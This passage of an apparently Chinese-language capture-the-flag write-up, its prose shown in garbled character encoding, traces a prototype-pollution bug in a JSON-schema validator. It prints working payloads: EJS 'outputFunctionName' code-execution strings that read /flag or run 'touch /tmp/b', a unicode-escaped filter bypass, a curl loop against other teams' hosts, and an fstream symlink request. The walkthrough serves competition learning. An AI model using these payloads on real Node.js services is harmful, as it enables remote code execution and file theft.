class="hljs-string">" disallowed value was matched"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (value !== <span class="hljs-literal">null</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.items) {</span><br><span class="line">          <span class="hljs-keyword">var</span> itemsIsArray = schema.items <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>;</span><br><span class="line">          <span class="hljs-keyword">var</span> propDef = schema.items;</span><br><span class="line">          <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, l = value.length; i &lt; l; i += <span class="hljs-number">1</span>) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (itemsIsArray) propDef = schema.items[i];</span><br><span class="line">            <span class="hljs-keyword">if</span> (options.coerce) value[i] = options.coerce(value[i], propDef);</span><br><span class="line">            errors.concat(checkProp(value[i], propDef, path, i));</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.minItems &amp;&amp; value.length &lt; schema.minItems) {</span><br><span class="line">          addError(<span class="hljs-string">"There must be a minimum of "</span> + schema.minItems + <span class="hljs-string">" in the array"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (schema.maxItems &amp;&amp; value.length &gt; schema.maxItems) {</span><br><span class="line">          addError(<span class="hljs-string">"There must be a maximum of "</span> + schema.maxItems + <span class="hljs-string">" in the array"</span>);</span><br><span class="line">        }</span><br><span class="line">      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (schema.properties || schema.additionalProperties) {</span><br><span class="line">        errors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.pattern &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">'string'</span> &amp;&amp; !value.match(schema.pattern)) {</span><br><span class="line">        addError(<span class="hljs-string">"does not match the regex pattern "</span> + schema.pattern);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.maxLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">'string'</span> &amp;&amp; value.length &gt; schema.maxLength) {</span><br><span class="line">        addError(<span class="hljs-string">"may only be "</span> + schema.maxLength + <span class="hljs-string">" characters long"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema.minLength &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-string">'string'</span> &amp;&amp; value.length &lt; schema.minLength) {</span><br><span class="line">        addError(<span class="hljs-string">"must be at least "</span> + schema.minLength + <span class="hljs-string">" characters long"</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.minimum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.minimum &amp;&amp; schema.minimum &gt; value) {</span><br><span class="line">        addError(<span class="hljs-string">"must have a minimum value of "</span> + schema.minimum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maximum !== <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-keyword">typeof</span> value == <span class="hljs-keyword">typeof</span> schema.maximum &amp;&amp; schema.maximum &lt; value) {</span><br><span class="line">        addError(<span class="hljs-string">"must have a maximum value of "</span> + schema.maximum);</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (schema[<span class="hljs-string">'enum'</span>]) {</span><br><span class="line">        <span class="hljs-keyword">var</span> enumer = schema[<span class="hljs-string">'enum'</span>];</span><br><span class="line">        l = enumer.length;</span><br><span class="line">        <span class="hljs-keyword">var</span> found;</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; l; j++) {</span><br><span class="line">          <span class="hljs-keyword">if</span> (enumer[j] === value) {</span><br><span class="line">            found = <span class="hljs-number">1</span>;</span><br><span class="line">            <span class="hljs-keyword">break</span>;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (!found) {</span><br><span class="line">          addError(<span class="hljs-string">"does not have a value in the enumeration "</span> + enumer.join(<span class="hljs-string">", "</span>));</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> schema.maxDecimal == <span class="hljs-string">'number'</span> &amp;&amp; (value.toString().match(<span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">"\\.[0-9]{"</span> + (schema.maxDecimal + <span class="hljs-number">1</span>) + <span class="hljs-string">",}"</span>)))) {</span><br><span class="line">        addError(<span class="hljs-string">"may only have "</span> + schema.maxDecimal + <span class="hljs-string">" digits of decimal places"</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// validate an object against a schema</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkObj</span>(<span class="hljs-params">instance, objTypeDef, path, additionalProp</span>) </span>{</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">'object'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> instance != <span class="hljs-string">'object'</span> || instance <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">"an object is required"</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (objTypeDef.hasOwnProperty(i)) {</span><br><span class="line">        <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">        <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">        <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">        <span class="hljs-comment">// set default</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">"default"</span>]) {</span><br><span class="line">          value = instance[i] = propDef[<span class="hljs-string">"default"</span>];</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">if</span> (options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">          value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">        }</span><br><span class="line">        checkProp(value, propDef, path, i);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> instance) {</span><br><span class="line">    <span class="hljs-keyword">if</span> (instance.hasOwnProperty(i) &amp;&amp; !(i.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">'_'</span> &amp;&amp; i.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">'_'</span>) &amp;&amp; objTypeDef &amp;&amp; !objTypeDef[i] &amp;&amp; additionalProp === <span class="hljs-literal">false</span>) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.filter) {</span><br><span class="line">        <span class="hljs-keyword">delete</span> instance[i];</span><br><span class="line">        <span class="hljs-keyword">continue</span>;</span><br><span class="line">      } <span class="hljs-keyword">else</span> {</span><br><span class="line">        errors.push({</span><br><span class="line">          property: path,</span><br><span class="line">          message: (<span class="hljs-keyword">typeof</span> value) + <span class="hljs-string">"The property "</span> + i + <span class="hljs-string">" is not defined in the schema and the schema does not allow additional properties"</span></span><br><span class="line">        });</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">var</span> requires = objTypeDef &amp;&amp; objTypeDef[i] &amp;&amp; objTypeDef[i].requires;</span><br><span class="line">    <span class="hljs-keyword">if</span> (requires &amp;&amp; !(requires <span class="hljs-keyword">in</span> instance)) {</span><br><span class="line">      errors.push({</span><br><span class="line">        property: path,</span><br><span class="line">        message: <span class="hljs-string">"the presence of the property "</span> + i + <span class="hljs-string">" requires that "</span> + requires + <span class="hljs-string">" also be present"</span></span><br><span class="line">      });</span><br><span class="line">    }</span><br><span class="line">    value = instance[i];</span><br><span class="line">    <span class="hljs-keyword">if</span> (additionalProp &amp;&amp; (!(objTypeDef &amp;&amp; <span class="hljs-keyword">typeof</span> objTypeDef == <span class="hljs-string">'object'</span>) || !(i <span class="hljs-keyword">in</span> objTypeDef))) {</span><br><span class="line">      <span class="hljs-keyword">if</span> (options.coerce) {</span><br><span class="line">        value = instance[i] = options.coerce(value, additionalProp);</span><br><span class="line">      }</span><br><span class="line">      checkProp(value, additionalProp, path, i);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (!_changing &amp;&amp; value &amp;&amp; value.$schema) {</span><br><span class="line">      errors = errors.concat(checkProp(value, value.$schema, path, i));</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> errors;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>é¦–å…ˆç¬¬ä¸€æ¬¡æˆ‘ä»¬ä¼šè¿›å…¥åˆ° <code>checkProp</code> å‡½æ•°ï¼Œä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼Œå¹¶è¿›è¡Œå¾ªç¯</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkProp(instance,instance.$schema,<span class="hljs-string">''</span>,<span class="hljs-string">''</span>);</span><br><span class="line"><span class="hljs-comment">//instance = {"$schema": {"properties": {"__proto__": {"properties": {"path": {"default": "/flag"}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//instance.$schema = {"properties": {"__proto__": {"properties": {"path": {"default": "/flag"}}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>æ¥ç€åœ¨ç»è¿‡åˆ¤æ–­ä¹‹åè¿›å…¥<code>checkObj</code>å‡½æ•°</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = {"$schema": {"properties": {"__proto__": {"properties": {"path": {"default": "/flag"}}}}}}</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {"__proto__": {"properties": {"path": {"default": "/flag"}}}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>åœ¨å‡½æ•°å¾ªç¯ä¸­ï¼Œå†æ¬¡è¿›å…¥åˆ°<code>checkProp</code>å‡½æ•°</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">"default"</span>]){</span><br><span class="line">      value = instance[i] = propDef[<span class="hljs-string">"default"</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">      value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">    <span class="hljs-comment">//i = __proto__</span></span><br><span class="line">    <span class="hljs-comment">//value = prototype</span></span><br><span class="line">    <span class="hljs-comment">//propDDef = {"properties": {"path": {"default": "/flag"}}}</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>å†æ¬¡ç”±åˆ¤æ–­è¿›å…¥åˆ°<code>checkObj</code>å‡½æ•°ï¼Œä¼ å…¥ä»¥ä¸‹å‚æ•°ï¼Œè¿™æ—¶å€™æ³¨æ„<code>value</code>å‚æ•°å·²ç»è¢«æŒ‡å‘<code>Function.prototype</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(schema.properties || schema.additionalProperties){</span><br><span class="line">trueerrors.concat(checkObj(value, schema.properties, path, schema.additionalProperties));</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//value = prototype</span></span><br><span class="line"><span class="hljs-comment">//schema.properties = {"path": {"default": "/flag"}}</span></span><br><span class="line"><span class="hljs-comment">//path = "__proto__"</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>æ‰€ä»¥å½“å†æ¬¡åœ¨è¿™é‡Œè¿›è¡Œèµ‹å€¼çš„æ—¶å€™ï¼Œ<code>instance</code>æ­¤æ—¶æŒ‡å‘<code>Function.prototype</code>ï¼Œå‚æ•° i ä¸º <code>path</code>ï¼Œå³è¢« <code>propDef['default']</code> ä¿®æ”¹æˆäº†<code>/flag</code>ï¼Œè‡³æ­¤å®Œæˆäº†åŸå‹é“¾æ±¡æŸ“</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//instance = prototype</span></span><br><span class="line"><span class="hljs-comment">//objTypeDef = {"path": {"default": "/flag"}}</span></span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i <span class="hljs-keyword">in</span> objTypeDef){ </span><br><span class="line">  <span class="hljs-keyword">if</span>(objTypeDef.hasOwnProperty(i)){</span><br><span class="line">    <span class="hljs-keyword">var</span> value = instance[i];</span><br><span class="line">    <span class="hljs-comment">// skip _not_ specified properties</span></span><br><span class="line">    <span class="hljs-keyword">if</span> (value === <span class="hljs-literal">undefined</span> &amp;&amp; options.existingOnly) <span class="hljs-keyword">continue</span>;</span><br><span class="line">    <span class="hljs-keyword">var</span> propDef = objTypeDef[i];</span><br><span class="line">    <span class="hljs-comment">// set default</span></span><br><span class="line">    <span class="hljs-comment">//i = path</span></span><br><span class="line">    <span class="hljs-comment">//value = undefined</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {"default": "/flag"}</span></span><br><span class="line">    <span class="hljs-keyword">if</span>(value === <span class="hljs-literal">undefined</span> &amp;&amp; propDef[<span class="hljs-string">"default"</span>]){</span><br><span class="line">    value = instance[i] = propDef[<span class="hljs-string">"default"</span>];</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span>(options.coerce &amp;&amp; i <span class="hljs-keyword">in</span> instance){</span><br><span class="line">    value = instance[i] = options.coerce(value, propDef);</span><br><span class="line">    }</span><br><span class="line">    checkProp(value,propDef,path,i);</span><br><span class="line">truetrue<span class="hljs-comment">//value = "/flag"</span></span><br><span class="line">    <span class="hljs-comment">//propDef = {"default": "/flag"}</span></span><br><span class="line">    <span class="hljs-comment">//path = "__proto__"</span></span><br><span class="line">    <span class="hljs-comment">//i = "path"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ•´ä¸ªè¿‡ç¨‹è¿™é‡Œå†™çš„æ¯”è¾ƒç®€å•ï¼Œä¸è¿‡åªè¦ç®€å• debug å°±å¯ä»¥å¼„æ˜ç™½æ•´ä¸ªæµç¨‹ï¼Œå¹¶ä¸ç®—å¾ˆéš¾ã€‚æ±¡æŸ“äº† <code>path</code> ä¹‹åï¼Œå°±å¯ä»¥è·Ÿå‰é¢çš„ä¸€æ ·ï¼Œç›´æ¥é€šè¿‡<code>fs.readFileSync(p.path).toString()</code>æ¥æ‹¿ flag äº†ã€‚</p><p>å½“ç„¶è¿˜å¯ä»¥æ±¡æŸ“ express ejs </p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"$schema"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"__proto__"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"outputFunctionName"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"x;return eval(\"process.mainModule.require('fs').readFileSync('/fl'+'ag').toString('base64')\");//x"</span>},<span class="hljs-attr">"path"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"/foo"</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>å› ä¸ºå¦‚æœè¦æ±¡æŸ“ ejs çš„è¯éœ€è¦ç”¨åˆ°<code>res.render</code>ï¼Œè€Œåœ¨ app.js ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªé”™è¯¯å¤„ç†çš„åœ°æ–¹ä½¿ç”¨åˆ°äº†<code>res.render</code></p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="hljs-string">"view engine"</span>, <span class="hljs-string">"ejs"</span>);</span><br><span class="line"><span class="hljs-comment">//...</span></span><br><span class="line"><span class="hljs-comment">// error handler</span></span><br><span class="line">app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="hljs-string">"env"</span>) === <span class="hljs-string">"development"</span> ? err: {};</span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="hljs-number">500</span>);</span><br><span class="line">  res.render(<span class="hljs-string">"error"</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæŠ¥é”™æ¥è§¦å‘è¿™ä¸ª<code>res.render</code>ï¼Œè€Œæˆ‘ä»¬ä¼ å…¥çš„<code>"path":{"type":"string","default":"/foo"}</code>å°±èµ·åˆ°äº†æ±¡æŸ“ä¹‹å‰çš„ path è®© nodejs è¯»å–åˆ°äº†ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶å¼•èµ·æŠ¥é”™ï¼Œè¿›è€Œè¿›å…¥é”™è¯¯å¤„ç†æ¥å®ç° ejs çš„å‘½ä»¤æ‰§è¡Œã€‚</p><p>æ‰€ä»¥ä¹‹å‰å¯¹äº flat çš„åŸå‹é“¾æ±¡æŸ“ä¹Ÿå¯ä»¥æ ¹æ®åŒæ ·çš„åŸç†è¿›è¡Œ RCE ï¼š</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"__proto__.outputFunctionName"</span>: <span class="hljs-string">"a=1;process.mainModule.require('child_process').exec('touch /tmp/b')//"</span>,<span class="hljs-attr">"__proto__.path"</span>: <span class="hljs-string">"/foo"</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿˜æœ‰ä¸€äº›æ”¹å˜å°±æ˜¯åˆ©ç”¨ç¼–ç æ¥ç»•è¿‡ä¸€äº› waf å…³é”®å­—ï¼š</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"$schema"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"__proto__"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"object"</span>,<span class="hljs-attr">"properties"</span>:{<span class="hljs-attr">"outputFunctionName"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"x;return eval(`\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u002e\\u006d\\u0061\\u0069\\u006e\\u004d\\u006f\\u0064\\u0075\\u006c\\u0065\\u002e\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065\\u0028\\u0060\\u0066\\u0073\\u0060\\u0029\\u002e\\u0072\\u0065\\u0061\\u0064\\u0046\\u0069\\u006c\\u0065\\u0053\\u0079\\u006e\\u0063\\u0028\\u0060\\u002f\\u0066\\u006c\\u0060\\u002b\\u0060\\u0061\\u0067\\u0060\\u0029\\u002e\\u0074\\u006f\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0060\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u0060\\u0029`);//x"</span>},<span class="hljs-attr">"path"</span>:{<span class="hljs-attr">"type"</span>:<span class="hljs-string">"string"</span>,<span class="hljs-attr">"default"</span>:<span class="hljs-string">"/foo"</span>}}}}}}</span><br></pre></td></tr></tbody></table></figure><p></p><p>èµ›åè·Ÿ /bin/tw çš„é€‰æ‰‹äº¤æµäº†ä¸€ä¸‹ï¼Œä»–ä»¬çš„ payload åˆ°åé¢ä»ç„¶å¯ä»¥æ‰“å¥½å‡ ä¸ªé˜Ÿï¼Œäºæ˜¯å»è¦äº†ä¸€ä»½ POC ï¼Œå¦‚ä¸‹ï¼Œä¹Ÿæ˜¯å¤§æ¦‚ç±»ä¼¼çš„ä¸€ä¸ªå†™æ³•ï¼š</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.13.37.<span class="hljs-variable">$i</span>:14017/config/validated/json-schema/validate -H <span class="hljs-string">'content-type: application/json'</span> --data <span class="hljs-string">'{"$schema":{"type":"object","properties":{"__proto__":{"type":"object","properties":{"outputFunctionName":{"type":"string","default":"x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x"},"path":{"type":"string","default":"/foo"}}}}}}'</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="fstream"><a href="#fstream" class="headerlink" title="fstream"></a>fstream</h3><p>è¿˜æœ‰ä¸€ä¸ªæ˜¯æˆ‘ä»¬é˜Ÿå¤§å¸ˆå‚…æ‰¾çš„</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/fstream/Writer</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line">{"type":"SymbolicLink","linkpath":"/flag","path":"public/stylesheets/11.png"}</span><br></pre></td></tr></tbody></table></figure><p></p><p>è¿™ä¸ªä¹Ÿæ²¡ä»€ä¹ˆå¥½åˆ†æçš„ï¼Œæ–‡æ¡£çœ‹ä¸€çœ‹ï¼š<a href="https://github.com/npm/fstream" target="_blank" rel="noopener">https://github.com/npm/fstream</a> å°±å¥½äº†ï¼Œè¿™é‡Œå½“æ—¶æˆ‘ä»¬è²Œä¼¼è¿˜æ£é¼“äº†ä¸€ä¼š json ä¼ å‚å•¥çš„ï¼Œä½†æ˜¯åæ¥è¯•äº†ä¸€ä¸‹<code>application/x-www-form-urlencoded</code> ä¹Ÿå¯ä»¥</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><h3 id="About-The-Web"><a href="#About-The-Web" class="headerlink" title="About The Web"></a>About The Web</h3><p>è¿™æ¬¡ Web å½“æ—¶æ¯”èµ›æˆ‘ä»¬ä¹Ÿéƒ½åœ¨åæ§½ï¼Œå› ä¸ºè¿™ä¸ª Web é¢˜å½“æ—¶è§‰å¾—å¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œç®€ç›´å°±ç›´æ¥ç»™äº†ä¸€ä¸ªåé—¨ï¼Œè€Œä¸”ç¡®å®æ•´ä¸ªæ¯”èµ›å¼„èµ·æ¥ä¸ä»…æ˜¯ Web 